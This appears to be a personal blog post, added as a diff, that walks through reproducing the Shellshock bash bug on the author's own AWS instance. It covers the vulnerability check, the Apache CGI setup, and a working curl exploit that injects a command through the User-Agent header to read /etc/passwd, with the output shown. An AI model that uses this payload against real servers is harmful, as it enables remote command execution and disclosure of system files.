@@ -1,0 +1,133 @@
+---
+layout: post
+title: Shellshock DIY
+category: posts
+image: shellshock/header.png
+---
+
+When news of Shellshock first broke, the main attack vector was applications running on Apache servers via cgi. Now I don't have any apache servers I maintain and if I did I probably wouldn't be running them with CGI (just not my preference). However I wanted to try out this bug and I didn't want to do so in a malicious manner; I simply wanted to see what it did.
+
+So let's go create an EC2 instance on AWS and get to work. My preference is to use Ubuntu because I know it best and I'm able to find solutions to issues I encounter very quickly.
+
+After our instance is up and running and we've ssh'd into it, the first thing we'll do is see if bash is vulnerable.
+
+{% highlight bash %}
+~ ubuntu@ip-10-0-0-153
+❯ env X="() { :;} ; echo busted" /bin/bash -c "echo completed"
+busted
+completed
+{% endhighlight %}
+
+Oh heck yeah, it totally is.
+
+(Side note: I'm using an old AWS image I made a few months ago. I believe Amazon patched bash on all their default images. If bash is already patched on your machine my next suggestion is to find a vagrant image that isn't patched yet. If you can't, leave a comment below. I may be able to post a tutorial on how to compile an old, vulnerable version of bash and replace the patched one on your box; for science!) 
+
+Ok next step: installing apache and enabling mod_cgi.
+
+{% highlight bash %}
+sudo apt-get install apache2
+sudo a2enmod cgi
+{% endhighlight %}
+
+We need to tell apache when to use cgi. We'll do that by adding the following somewhere in the config of a site in our enabled virtual hosts folder (`/etc/apache2/sites-enabled`; in our case the exact file is `/etc/apache2/sites-enabled/000-default.conf`):
+
+{% highlight apache %}
+ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+<Directory "/usr/lib/cgi-bin">
+  AllowOverride None
+  Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
+  Order allow,deny
+  Allow from all
+</Directory>
+{% endhighlight %}
+
+
+My complete apache conf file for the virtual host we'll be using looks like this:
+
+{% highlight apache %}
+<VirtualHost *:80>
+  ServerAdmin webmaster@localhost
+  DocumentRoot /var/www/html
+
+  ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+  <Directory "/usr/lib/cgi-bin">
+    AllowOverride None
+    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
+    Order allow,deny
+    Allow from all
+  </Directory>
+
+  ErrorLog ${APACHE_LOG_DIR}/error.log
+  CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+{% endhighlight %}
+
+
+Add a file called `poc.cgi` to `/usr/lib/cgi-bin` with the following contents:
+
+{% highlight perl %}
+#!/bin/bash
+
+echo "Content-type: text/html"
+echo ""
+
+echo '<html>'
+echo '<head>'
+echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'
+echo '<title>PoC</title>'
+echo '</head>'
+echo '<body>'
+echo '<pre>'
+/usr/bin/env
+echo '</pre>'
+echo '</body>'
+echo '</html>'
+
+exit 0
+{% endhighlight %}
+
+Source: https://www.invisiblethreat.ca/2014/09/cve-2014-6271/
+
+Note: you may need to change the permissions of this file and directory. If you get a 403 error, try `sudo chmod 755 -R /usr/lib/cgi-bin`.
+
+Now let's restart apache.
+
+{% highlight bash %}
+sudo services apache2 restart
+{% endhighlight %}
+
+
+If everything went according to plan, we should be able to exploit ourselves; Let's try it out!
+
+{% highlight bash %}
+~
+❯ curl -A "() { foo;};echo;/bin/cat /etc/passwd" http://[Your Server IP]/cgi-bin/poc.cgi
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+landscape:x:103:109::/var/lib/landscape:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/zsh
+
+{% endhighlight %}
+
+Aww yiss.
